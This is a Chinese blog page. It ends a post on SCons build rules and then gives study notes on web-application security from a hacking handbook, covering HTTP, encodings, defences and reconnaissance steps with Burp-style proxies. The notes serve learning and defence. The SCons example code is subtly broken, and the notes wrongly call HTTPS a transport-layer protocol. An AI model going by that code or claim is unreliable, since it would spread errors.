<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object(<span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line"><span class="comment"># 将判断方法设置为使用时间戳</span></span><br><span class="line">Decider(<span class="string">&#x27;timestamp-newer&#x27;</span>) </span><br></pre></td></tr></table></figure>

<p>普通的时间戳存在一个问题，即某个文件如果从仓库签出了一个旧版本，由于它的时间戳比当前的目标文件更早，所以不会判断为出现更新，导致编译错误；针对这种情况，可以使用 timestamp-match 规则来进行判断</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object(<span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用 timestamp-match 规则进行判断，只要时间戳不吻合，即需要重新构建，不管新旧</span></span><br><span class="line">Decider(<span class="string">&#x27;timestamp-match&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="使用混合规则"><a href="#使用混合规则" class="headerlink" title="使用混合规则"></a>使用混合规则</h4><p>仅当文件的时间戳出现了变化，再去计算文件的 MD5 值是否发生了变化，这样性能更好；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program(<span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用混合的规则</span></span><br><span class="line">Decider(<span class="string">&#x27;MD5-timestamp&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="自定义规则"><a href="#自定义规则" class="headerlink" title="自定义规则"></a>自定义规则</h4><p>可以自己写一个判断规则的函数，然后传递给 Decider 即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Program(<span class="string">&#x27;hello.c&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decide_if_changed</span>(<span class="params">dependency, target, prev_ni</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.get_timestamp() != prev_ni.timestamp:</span><br><span class="line">        dep = <span class="built_in">str</span>(dependency)</span><br><span class="line">        tgt = <span class="built_in">str</span>(target)</span><br><span class="line">        <span class="keyword">if</span> specific_part_of_file_has_changed(dep, tgt):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    Decider(decide_if_changed)</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/17/scons%20%E7%94%A8%E6%B3%95/" data-id="cm1c2i811002lpkhp7oy90tht" data-title="scons 用法" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-黑客攻防技术宝典" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/05/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%AE%9D%E5%85%B8/" class="article-date">
  <time class="dt-published" datetime="2020-12-05T02:18:00.000Z" itemprop="datePublished">2020-12-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/05/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E5%AE%9D%E5%85%B8/">黑客攻防技术宝典</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-Web应用程序案例与风险"><a href="#1-Web应用程序案例与风险" class="headerlink" title="1. Web应用程序案例与风险"></a>1. Web应用程序案例与风险</h1><h2 id="Web应用程序的发展历程"><a href="#Web应用程序的发展历程" class="headerlink" title="Web应用程序的发展历程"></a>Web应用程序的发展历程</h2><p>早期Web服务器仅提供静态内容，可以被任意人公开访问；今天则完全变了，Web服务器可以提供非常丰富的服务；</p>
<h2 id="Web应用程序安全"><a href="#Web应用程序安全" class="headerlink" title="Web应用程序安全"></a>Web应用程序安全</h2><p>虽然很多站点声明自己是安全的，但实际上并非如此。超过一半以上的安全存在各式各样的漏洞；</p>
<ul>
<li>不完善的身份验证措施：62%；</li>
<li>不完善的访问控制措施：71%；</li>
<li>SQL 注入：32%；</li>
<li>跨站点脚本：94%；</li>
<li>信息泄露：78%；</li>
<li>跨站点请求伪造：92%；</li>
</ul>
<h3 id="核心安全问题：用户可提交任意输入"><a href="#核心安全问题：用户可提交任意输入" class="headerlink" title="核心安全问题：用户可提交任意输入"></a>核心安全问题：用户可提交任意输入</h3><p>用户在浏览器事实上拥有无限的权限，因此可以提交任意非开发者预期的内容，而开发者需要假设所有的输入都可能是恶意的，并进行防范；</p>
<h3 id="关键问题因素"><a href="#关键问题因素" class="headerlink" title="关键问题因素"></a>关键问题因素</h3><p>以下几点原因让问题变得更加严重了：</p>
<ul>
<li>不成熟的安全意识</li>
<li>独立开发</li>
<li>欺骗性的简化；</li>
<li>快速发展的攻击技术；</li>
<li>资源与时间限制；</li>
<li>技术上强其所难；</li>
<li>对功能的需求不断增加；</li>
</ul>
<h3 id="新的安全边界"><a href="#新的安全边界" class="headerlink" title="新的安全边界"></a>新的安全边界</h3><p>早期安全边界在于防火墙层级，但随着Web应用程序的功能变得更加模块后，需要访问操作系统中或者之间不同功能模块，例如数据库，使得安全边界问题缩小到了Web应用程序内部；</p>
<h3 id="Web应用程序安全的未来"><a href="#Web应用程序安全的未来" class="headerlink" title="Web应用程序安全的未来"></a>Web应用程序安全的未来</h3><p>暂时还没有迹象显示安全问题能够在不远的未来得到解决，因为整个行业远未形成成熟的意识或者能力；</p>
<h1 id="2-核心防御机制"><a href="#2-核心防御机制" class="headerlink" title="2. 核心防御机制"></a>2. 核心防御机制</h1><h2 id="处理用户访问"><a href="#处理用户访问" class="headerlink" title="处理用户访问"></a>处理用户访问</h2><p>多数Web应用使用以下三种安全机制处理用户访问，但由于这三个机制之间相互依赖，因此导致它们不能达到预期的安全保护目标；</p>
<ul>
<li>身份验证</li>
<li>会话管理</li>
<li>访问控制：由于这方面的控制相当复杂，因此一般存在大量的安全漏洞；</li>
</ul>
<h2 id="处理用户输入"><a href="#处理用户输入" class="headerlink" title="处理用户输入"></a>处理用户输入</h2><h3 id="输入的多样性"><a href="#输入的多样性" class="headerlink" title="输入的多样性"></a>输入的多样性</h3><p>有些字段有特殊格式的输入要求，但有些字段，例如文章、备注等，则需要允许各式各样的输入值；</p>
<p>当探查到用户的非法输入，正常应该拒绝用户提交的，并将事件记录到日志文件中，以便随后进行调查；</p>
<h3 id="输入处理方法"><a href="#输入处理方法" class="headerlink" title="输入处理方法"></a>输入处理方法</h3><h4 id="拒绝已知的不良输入"><a href="#拒绝已知的不良输入" class="headerlink" title="拒绝已知的不良输入"></a>拒绝已知的不良输入</h4><p>通常是使用一个黑名单，包含一组攻击中会使用的模式，阻击任何与黑名单匹配的数据；但这种方法的效率不同，也存在各种绕过的方法；</p>
<h4 id="接受已知的正常输入"><a href="#接受已知的正常输入" class="headerlink" title="接受已知的正常输入"></a>接受已知的正常输入</h4><p>使用一个白名单；这种方法比黑名单要好得多，但有时候有些字段存在迫不得已的情况，例如用户的姓名；</p>
<h4 id="净化"><a href="#净化" class="headerlink" title="净化"></a>净化</h4><p>即在开始处理数据之前，先对数据进行净化，删除或转义可能存在的恶意字符；这种方法一般非常有效；不过在一个输入项中容纳多个可能的恶意数据时，有时不能完全净化成功；</p>
<h4 id="安全数据处理"><a href="#安全数据处理" class="headerlink" title="安全数据处理"></a>安全数据处理</h4><p>通过确保处理的过程绝对安全，例如在数据库查询过程中使用参数化查询以避免 SQL 注入攻击；这也是一项有效的通用方法，不过不能够适用于Web应用程序需要执行的每个操作；</p>
<h4 id="语法检查"><a href="#语法检查" class="headerlink" title="语法检查"></a>语法检查</h4><p>攻击的输入是正常的，但输入的用途是非法的，例如伪装成他人的账号；</p>
<h3 id="边界确认"><a href="#边界确认" class="headerlink" title="边界确认"></a>边界确认</h3><p>由于Web 应用程序提供的功能很广泛，因此不同功能组件之间并不存在一个统一的安全边界，需要具体情况具体处理，每个功能组件执行自己的安全检查；</p>
<h3 id="多步确认与规范化"><a href="#多步确认与规范化" class="headerlink" title="多步确认与规范化"></a>多步确认与规范化</h3><p>Web应用程序有时会对用户输入进行多步的确认，或者做一些规范化的操作，此时攻击者可以专门设计一些针对这些操作的输入字符，以避开检查机制；</p>
<h2 id="处理攻击者"><a href="#处理攻击者" class="headerlink" title="处理攻击者"></a>处理攻击者</h2><p>常见措施：</p>
<ul>
<li>处理错误</li>
<li>维护审计日志；</li>
<li>向管理员发出警报；</li>
<li>应对攻击；</li>
</ul>
<h3 id="处理错误"><a href="#处理错误" class="headerlink" title="处理错误"></a>处理错误</h3><p>避免向用户返回任何由系统生成的错误信息，因为它们将非常容易被攻击者有效利用；一般使用 try…catch 机制来生成自定义的错误信息，并将异常情况记录到日志中，以便后续进一步检查处理；</p>
<h3 id="维护审计日志"><a href="#维护审计日志" class="headerlink" title="维护审计日志"></a>维护审计日志</h3><p>在任何注重安全的应用程序中，日志应记录所有重要事件，这些事件至少包括：</p>
<ul>
<li>所有与身份验证功能相关的事件，如成功或失败的登录，密码修改等；</li>
<li>关键交易，例如信用卡支付与转账；</li>
<li>被访问控制机制阻止的访问企图；</li>
<li>任何包含已知攻击字符串，公然表明恶意意图的请求；</li>
</ul>
<p>有效的审计日志一般会记得每个事件的发生时间、发出请求的IP地址、用户的账号等信息；这些信息需要进行严格的保护，避免未授权的读取或写入访问。一般来说，需要将它们存储在单独的系统中，仅允许主应用程序访问，或者存储在一次性写入的介质中；如果这些日志被攻击者利用，将可能使攻击者立即攻破整个应用程序；</p>
<h3 id="向管理员发出警报"><a href="#向管理员发出警报" class="headerlink" title="向管理员发出警报"></a>向管理员发出警报</h3><p>警报监控的反应事件一般包括：</p>
<ul>
<li>应用反常：如收到由单独一个IP 地址或用户发出的大量请求（表明应用程序正受到自定义攻击）；</li>
<li>交易反常；</li>
<li>包含已知攻击字符串的请求；</li>
<li>请求中普通用户无法查看的数据被修改；</li>
</ul>
<p>由于每个应用程序实际业务场景各不相同，因此最好的警报机制，是根据当前业务场景，判断哪些输入是普通用户不可能出现的，然后与警报机制整合，第一时间发出警报；</p>
<h3 id="应对攻击"><a href="#应对攻击" class="headerlink" title="应对攻击"></a>应对攻击</h3><p>当发现攻击者时，应当设计能够采取自动反应的措施，以阻止攻击进行探查，例如对其提交的请求的响应速度变缓慢，或将其加入黑名单1-2天，或者终止攻击者的会话，要求其重新登录等；</p>
<p>当然，最重要的事件还是应该立即修复应用程序中存在的所有漏洞；</p>
<h2 id="管理应用程序"><a href="#管理应用程序" class="headerlink" title="管理应用程序"></a>管理应用程序</h2><p>很多应用程序使用相同的 Web 界面在内部执行管理功能，但是它无形中也变成一个主要的攻击目标，因为攻破这个界面后，能够有效提升权限；</p>
<h1 id="3-Web应用程序技术"><a href="#3-Web应用程序技术" class="headerlink" title="3. Web应用程序技术"></a>3. Web应用程序技术</h1><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h4 id="HTTP-请求头部中的一些字段："><a href="#HTTP-请求头部中的一些字段：" class="headerlink" title="HTTP 请求头部中的一些字段："></a>HTTP 请求头部中的一些字段：</h4><ul>
<li>Referer：用来表示发出请求的原始 URL；</li>
<li>User-Agent：用来显示发出请求的客户端（如浏览器）的信息</li>
<li>Host：用来显示被访问的 URL 中的主机名称；</li>
<li>Cookie：用来显示服务器向客户端发送的参数；</li>
</ul>
<h4 id="HTTP-响应中的一些字段"><a href="#HTTP-响应中的一些字段" class="headerlink" title="HTTP 响应中的一些字段"></a>HTTP 响应中的一些字段</h4><ul>
<li>Server：用来显示服务端所使用的服务器程序，例如：Apache、Nginx、 Microsoft-IIS等；</li>
<li>Pragma：用来告知浏览器不要缓存结果（适用于动态资源的场景）；</li>
<li>Expires：用来告知浏览器当前资源的过期时间；</li>
<li>Content-Type：用来告知浏览器主体的内容类型，以便浏览器可以正确解析；</li>
<li>Content-Length：用来告知浏览器主体的长度；</li>
</ul>
<h4 id="HTTP-方法"><a href="#HTTP-方法" class="headerlink" title="HTTP 方法"></a>HTTP 方法</h4><p>由于 GET 请求会将请求参数显示在 URL 中，并且可以存储在书签或是放在请求头部的 Referer 字段中，因此应避免使用查询字符串传送任何敏感的信息；</p>
<p>其他方法：</p>
<ul>
<li>TRACE：当使用该方法访问某个资源时，服务端会在响应的主体中返回其收到的客户端的具体请求内容；因此，客户端可以用它来诊断自身发出的请求是否在中途被窜改了；</li>
<li>OPTIONS：用来向服务端询问某个资源允许的操作方法；服务端会在返回的响应的头部 Allow 字段中列出可执行的方法；</li>
</ul>
<blockquote>
<p>HTTP 还有其他一些允许的方法，如果服务端激活的方法越多，则面临被攻击的风险越大；</p>
</blockquote>
<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>常用的 URL 是绝对路径的格式，但其实也支持使用相对路径的格式；</p>
<h4 id="REST"><a href="#REST" class="headerlink" title="REST"></a>REST</h4><p>REST 风格的 URL 一般是指将查询参数放在路径中，而不是放在查询字符串中；</p>
<h4 id="HTTP-消息头"><a href="#HTTP-消息头" class="headerlink" title="HTTP 消息头"></a>HTTP 消息头</h4><h5 id="常用消息头："><a href="#常用消息头：" class="headerlink" title="常用消息头："></a>常用消息头：</h5><ul>
<li>Connection：告知对方在完成 HTTP 传输后，如何处理当前的 TCP 连接状态，例如保持开放，或者直接关闭；</li>
<li>Content-Encoding：为消息主体中的内容指定编码格式，例如 gzip（很多应用会使用该格式来压缩响应主体中的内容，以提高传输的速度）；</li>
<li>Transfer-Encoding：为某段传输指定编码格式（一个 HTTP 连接可以分成多段传输，每一段的消息可以使用不同的编码格式，例如：chunked、compress、deflate、gzip、identity等）；</li>
</ul>
<h5 id="请求消息头"><a href="#请求消息头" class="headerlink" title="请求消息头"></a>请求消息头</h5><ul>
<li>Accept：客户端用它来告知服务端自己可以接收哪些类型的内容，例如图片、文档等；</li>
<li>Accept-Encoding：用来告知服务端，客户端可接受的内容编码方式；</li>
<li>Authorization：提供服务端所要求的认证类型和认证信息，例如：basic类型+用户名+密码，需要配合 HTTPS 使用，不然等同于明文传输账号密码；</li>
<li>If-Modified-Since：用来告知服务端浏览器最后一次收到当前所请求资源的时间；如果在那个时间之后，资源并未出现变化，则服务端不需返回资源内容，只需要返回304编码，告知客户端之前的缓存仍可用；</li>
<li>If-None-Match：用来告知服务端，如果服务端没有任何资源与该字段的 Etag 值匹配，则应返回所请求的资源，否则则无须返回，浏览器将使用本地的缓存；</li>
<li>Origin：用来告知服务器当前请求来自于哪个站点，该字段一般用于跨域 Ajax 请求中；</li>
<li>Referer：用来告知服务器表明当前请求所来源页面的地址；</li>
</ul>
<h5 id="响应消息头"><a href="#响应消息头" class="headerlink" title="响应消息头"></a>响应消息头</h5><ul>
<li>Access-Control-Allow-Origin：用来告知客户端是否允许跨域请求当前的资源；</li>
<li>ETag：为当前资源设置一个唯一标签，后续客户端可以使用该标签，向服务端询问所请求的资源是否已经过期；</li>
<li>Expires：用于告知客户端当前资源的过期时间；</li>
<li>Location：用来告知客户端资源重定向的目标地址，一般配合 3 开头的状态码使用；</li>
<li>Pragma：用来告知浏览器如何处理缓存，例如：no-cache；</li>
<li>Server：用来告知客户端，服务端当前使用的是什么样的服务器软件；</li>
<li>Set-Cookie：服务端用来向客户端发送 cookie 值；</li>
<li>WWW-Authenticate：服务端用其来告知客户端自己支持哪些身份验证方式，一般配合 401 状态码使用；</li>
<li>X-Frame-Options：服务端用其来告知客户端如何加载当前响应；</li>
</ul>
<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>cookie 一般由一个键值对构成，但也可包含任何不含空格的字符串；可以在服务器响应中使用几个 Set-Cookie 消息头发布多个 cookie；客户端也可以在 Cookie 消息头中用分号分隔不同的 cookie；</p>
<p>服务端发出的 Set-Cookie 消息头中，还可以包含一些额外的属性，以指示客户端如何处理使用 cookie， 包括：</p>
<ul>
<li>expires：用来设定 Cookie 的有效时间；如果没有值，则浏览器不会永久保存当前 cookie，仅用于当前浏览器会话中；如果有值，则浏览器会将 cookie 值在本地存储下来，并在随后的浏览器会话中重复使用；</li>
<li>domain：用来指定 cookie 可以有效使用的域；指示客户端仅可以将 cookie 用于 domain 所指定的域；</li>
<li>path：用于指定 cookie 可以使用的路径；</li>
<li>secure：限制只在 https 请求中使用 cookie；</li>
<li>HttpOnly：用来限制客户端无法使用 JavaScript 直接访问 cookie；</li>
</ul>
<h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h4><p>每条 HTTP 响应消息都会在它的第一行中包含一个状态码，状态码主要分为五类：</p>
<ul>
<li>1开头的：提供信息</li>
<li>2开头的：请求被成功处理；</li>
<li>3开头的：请求被重新定向到其他资源；</li>
<li>4开头的：请求中包含错误；</li>
<li>5开头的：服务器在处理请求时发生错误；</li>
</ul>
<h5 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h5><ul>
<li>100 Continue：已收到请求的消息头，但主体还没有完整收到，客户端应继续发送余下的主体，待全部收到后，将返回新的响应；</li>
<li>200 Ok：请求已成功处理，并在响应中返回了请求结果；</li>
<li>201 Created：请求已成功提交；</li>
<li>301 Moved Permanently：所请求的资源已经永久性的转移到一个新的地址，新地址放在 Location 字段中，客户端后续应使用这个新地址来访问相应的资源；</li>
<li>302 Found：所请求的资源临时转移到了一个新地址，新地址放在 Location 字段中；但转移只是临时的，后续请求该资源应仍然使用旧地址；</li>
<li>304 Not Modified：在客户端的请求中，会有一个 If-Modified-Since 字段，记录着客户端上一次收到该资源的时间，服务端根据这个时间，判断在那之后，资源是否发生过修改，如果没有修改，就可以发回 304 响应，告知客户端所请求的资源未更新，让客户端使用缓存中的资源副本；另外客户端也可以在请求首部中使用 If-None-Match 字段，并在该字段中放上资源的 Etag 值，如果服务端发现存在相同 Etag 值的资源，则返回 304 响应；如果不存在，则返回所请求的资源；</li>
<li>400 Bad Request：表示客户端提交了一个无效的请求；</li>
<li>401 Unauthorized：表示客户端的请求没有验证成功，同时服务端会在响应的 WWW-Authenticate 字段中放上如何验证的信息；</li>
<li>403 Forbidden：表示所请求的资源绝对禁止访问，有身份验证也不行；</li>
<li>404 Not Found：表示所请求的资源不存在；</li>
<li>405 Method Not Allow：表示所请求的方法不支持；</li>
<li>413 Request Entity Too Large：表示请求的主体过长，服务端无法处理；</li>
<li>414 Request URI Too Long：表示请求的地址过长，服务端无法处理；</li>
<li>500 Internal Server Error：表示服务端在处理请求时遇到错误；</li>
<li>503 Service Unavailable：表示服务端的服务器程序虽然运转正常，但处理请求的应用程序无法作出响应；</li>
</ul>
<h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p>HTTPS 跟 HTTP 一样，也属于传输层的协议，但是它使用 TLS&#x2F;SSL 对传输的数据进行了加密；</p>
<h4 id="HTTP-代理"><a href="#HTTP-代理" class="headerlink" title="HTTP 代理"></a>HTTP 代理</h4><p>当使用 HTTPS 和使用代理向服务端发起请求时，客户端无法和代理服务器完成 TSL 握手，因此，代理服务器只能被当作 TCP 中继来使用；这意味着如果能够控制代理服务器的话，就能拦截并修改客户端和服务端之间的请求和响应数据；这将非常有用（原因在于可以控制浏览器发出的请求，并分析和修改服务器返回的响应；多数渗透测试工具都是以代理服务器的形式来运行）；</p>
<h4 id="HTTP-身份验证"><a href="#HTTP-身份验证" class="headerlink" title="HTTP 身份验证"></a>HTTP 身份验证</h4><p>HTTP 身份验证有内置自己的身份验证功能，包括：</p>
<ul>
<li>Basic</li>
<li>NTLM</li>
<li>Digest</li>
</ul>
<p>由于 HTTP 内置的验证功能，会将服务端要求提供的验证身份信息（如密码）放到消息头部中，因此如果不使用 HTTPS 连接的，这种验证方式将会是很危险的，因为如果请求被拦截的话，就会导致验证信息暴露；如果使用了 HTTPS，则这种验证方式就没那么危险；</p>
<h2 id="Web-功能"><a href="#Web-功能" class="headerlink" title="Web 功能"></a>Web 功能</h2><h3 id="服务器端的功能"><a href="#服务器端的功能" class="headerlink" title="服务器端的功能"></a>服务器端的功能</h3><p>相对于互联网早期，服务器端提供的资源已经从以静态为主，变成了以动态资源为主，同时针对 Web 应用程序的开发也出现了各式各样的工具，了解这些工具，研究它们的漏洞，将十分有助于找出它们的案例隐患；</p>
<p>常用的服务端开发工具或平台包括：</p>
<ul>
<li>Java</li>
<li>ASP.Net</li>
<li>PHP</li>
<li>Ruby On Rails</li>
<li>SQL</li>
<li>XML</li>
<li>Web 服务</li>
</ul>
<h3 id="客户端的功能"><a href="#客户端的功能" class="headerlink" title="客户端的功能"></a>客户端的功能</h3><p>常用的浏览器开发工具或技术：</p>
<ul>
<li>HTML</li>
<li>超链接</li>
<li>表单</li>
<li>CSS</li>
<li>Javascript</li>
<li>VBScript</li>
<li>文档对象模型</li>
<li>Ajax</li>
<li>JSON</li>
<li>同源策略：从相同站点收到的内容，可以访问并修改该站点的其他内容；但不能访问或修改不同站点的内容；这个策略由浏览器实现；</li>
<li>HTML5</li>
<li>Web2.0</li>
<li>浏览器插件</li>
</ul>
<h3 id="状态与会话"><a href="#状态与会话" class="headerlink" title="状态与会话"></a>状态与会话</h3><p>会话即可保存在服务器端，也可以保存在客户端；保存在服务器端的话，则需要给客户端发送一个令牌；保存在客户端则可以减轻服务器的负担；但是保存在浏览器端的数据有可能被用户修改，因此在将数据发给客户端保存之前，一般会使用一个只有服务端才知道的值，对数据做散列值计算，之后将数据和散列值都发给客户端；客户端需要在下一次请求中同时携带会话数据和散列值，如果会话数据被修改了，则服务端对会话数据进行计算的散列值和用户提供的散列值将无法匹配（如果会话是存储在服务器端的话，就没有这个必要了，直接将散列后的会话 ID 发给客户端即可；之所以要做散列，目的是让客户端无法猜测出来其他会话 ID，以避免客户端冒充他人）；</p>
<h2 id="编码方案"><a href="#编码方案" class="headerlink" title="编码方案"></a>编码方案</h2><p>客户端发送给服务器的数据一般需要使用某种编码方案，服务器端在数据后，按照指定的方案对数据进行解码；因此，如果客户端操纵编码方案，有可能会让看似无害的信息，编码成另外一种解释；</p>
<h3 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h3><p>URL 的编码方案使用 ASCII 字符集中的可打印字符对数据进行编码；该编码方案以 % 开头；</p>
<blockquote>
<p>%20 代表空格，另外 + 加号也代表空格；</p>
</blockquote>
<p>有些字符是 URL 编码方案的保留关键字，因此如果在请求内容中使用这些字符，则需要对这些字符进行编码的转换，不然会被识别成关键字；包括：空格、%、？、&amp;、；、+、# 等；</p>
<h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h3><p>Unicode 编码以 %u 开头，之后是用十六进制表示的编码，例如 %u2215 表示斜杠 “&#x2F;“；</p>
<p>Unicode 的编码长度统一是4位的十六进制，相当于 16 位的二进制，或许也可叫做 UTF-16；</p>
<p>UTF-8 则是一种长度可变的编码方案，它有可能只有一个字节，也有可能有多个字节；由于大部分字符是不常用的，如果将常用的字符用短编码来表示的话，则将会大大减少编码后的内容长度，提高传输效率；</p>
<h3 id="HTML-编码"><a href="#HTML-编码" class="headerlink" title="HTML 编码"></a>HTML 编码</h3><p>在 HTML 文档中，由于 HTML 语言也有一些保留的关键字，因此如果在内容中使用了这些关键字，就需要对其进行 HTML 编码，以便不会识别成关键字；</p>
<p>HTML 编码使用了三种编码方案，都是以 &amp; 开头，包括：</p>
<ul>
<li>实体：例如 &amp;quot 表示双引号，&amp;apos 表示单引号，&amp;amp 表示 &amp;；</li>
<li>十进制：以&amp;# 开头并加上字符的 ASCII 编码，例如：&amp;#34 表示双引号，&amp;#39 表示单引号</li>
<li>十六进制：以&amp;#x 开头，并加上字符的 ASCII 编码的十六进制数，例如：&amp;#x22 表示双引号，&amp;#x27表示单引号；</li>
</ul>
<h3 id="Base64-编码"><a href="#Base64-编码" class="headerlink" title="Base64 编码"></a>Base64 编码</h3><p>Base64 编码使用 ASCII 中的可打印字符集合对内容进行编码，一般使用于邮件附件的编码，有时也用于 HTTP 内置的验证机制中对用户密码进行编码；</p>
<p>Base64 使用的可打印字符集很少，包括以下 26个英文大写&#x2F;小写字母，数字0-9，还有加号”+”、斜杠”&#x2F;“，其他就没有了，总共是64个字符；</p>
<p>计算机中的数据是以字节表示的，每个字节由8个二进制位构成，因此每三个字节就会有24个二进制位；24个二进制位可以分成4组，每组6个二进制位，每组用一个 Base64 字符来表示，这样每 3 个字节就可以转换成 4 个Base64 字符来表示；</p>
<p>因此，只需要将待转换数据的字节总数是 3 的倍数（不足时使用等号 &#x3D; 进行凑齐），就可以将其他转换成 Base64 字符来表示；</p>
<blockquote>
<p>即使对一段数据进行细微的修改，则转换后的 Base64 编码也会出现很大的差别，但是由于它使用等号来凑齐字符，因此很容易被识别出来是 base64 编码方案，导致失去防患效果；</p>
</blockquote>
<h3 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h3><p>用 ASCII 字符表示十六进制数据块，例如：daf 表示为 646166</p>
<h3 id="序列化框架工具"><a href="#序列化框架工具" class="headerlink" title="序列化框架工具"></a>序列化框架工具</h3><p>使用一些框架对待传输的数据进行序列化，这些框架包括：</p>
<ul>
<li>Flex 和 AMF</li>
<li>Silverlight 和 WCF</li>
<li>Java 序列化对象</li>
</ul>
<h1 id="4-解析应用程序"><a href="#4-解析应用程序" class="headerlink" title="4. 解析应用程序"></a>4. 解析应用程序</h1><p>步骤：</p>
<ul>
<li>枚举应用程序的功能</li>
<li>分析其核心安全机制和使用的技术，以暴露其主要的受攻击面；</li>
<li>发现可供利用的漏洞；</li>
</ul>
<h2 id="枚举内容与功能"><a href="#枚举内容与功能" class="headerlink" title="枚举内容与功能"></a>枚举内容与功能</h2><h3 id="Web自动抓取"><a href="#Web自动抓取" class="headerlink" title="Web自动抓取"></a>Web自动抓取</h3><p>通过爬虫工具将应用程序的所有页面抓取下来；常见的免费工具包括：</p>
<ul>
<li>Burp Suite</li>
<li>WebScarab</li>
<li>Zed Attack Proxy</li>
<li>CAT</li>
</ul>
<blockquote>
<p>有些网站会在其根据目录放一个 robots.txt 文件，用来告知爬虫或者搜索引擎其不想被列入索引的 URL，不过这有时反而变成一个突破口，让攻击者能够快速发现一些可抓取的目标；</p>
</blockquote>
<p>爬虫的自动抓取还是比较简单和机械的，它不过是不断探查每个页面中存在的超链接，然后不断向新链接发起请求，如果链接中有表单，它就伪造一些数据进行表单的提交；直到抓取完所有页面链接为止；</p>
<h4 id="自动抓取工具的一些不足"><a href="#自动抓取工具的一些不足" class="headerlink" title="自动抓取工具的一些不足"></a>自动抓取工具的一些不足</h4><ul>
<li>无法处理动态生成的链接；</li>
<li>无法抓取存放在对象中的链接；</li>
<li>无法应对输入检查；</li>
<li>每个链接只请求一次，但实际上相同链接，使用不同请求参数可能返回不同的内容；</li>
<li>无法应对 URL 中的随机数，会造成死循环；</li>
<li>无法应对身份验证机制；</li>
</ul>
<h3 id="用户指导的抓取"><a href="#用户指导的抓取" class="headerlink" title="用户指导的抓取"></a>用户指导的抓取</h3><p>在客户端和服务端之前设立一道拦截器，然后由用户人工浏览网站，做一些动作，之后拦截器根据拦截到的数据生成站点地图；这种方式可以克服前面自动抓取的多项不足；</p>
<h4 id="渗透测试步骤"><a href="#渗透测试步骤" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>配置浏览器，使用 Burp 或 WebScarab 作为本地代理服务器；</li>
<li>以常规方式浏览整个应用程序，访问发现的每一个链接，提交每一个表单并执行全部多阶段功能；分别在 javascript 启用与禁用、cookie 启用和禁用的情况下进行浏览；</li>
<li>检查由拦截工具生成的站点地图，找出手动浏览时没有发现的所有隐藏内容和功能，通过浏览器访问这些内容，以便拦截工具获得服务器的响应，从而确定其他所有内容；递归执行上述步骤，直到无法再找出新内容为止；</li>
<li>先将可能会导致会话中断的 URL 排除掉，然后基于余下的内容，让爬虫主动抓取站点内容；</li>
</ul>
<h3 id="发现隐藏的内容"><a href="#发现隐藏的内容" class="headerlink" title="发现隐藏的内容"></a>发现隐藏的内容</h3><p>常用的隐藏内容有：</p>
<ul>
<li>不同权限的用户登录后看到不同的内容；</li>
<li>上线后未删除的开发测试功能或者调试功能；</li>
<li>备份文件</li>
<li>文件快照的备份档案；</li>
<li>已部署但未上线可用的新功能；</li>
<li>已部署但对部分用户不可见的功能；</li>
<li>尚未从服务器上删除的旧版文件；</li>
<li>配置和包含敏感数据的文件；</li>
<li>当前应用程序功能的源文件；</li>
<li>包含有效用户名、会话令牌、被访问的 URL 以及所执行的操作的日志文件；</li>
<li>源代码中可能包含的用户名和密码等信息；</li>
</ul>
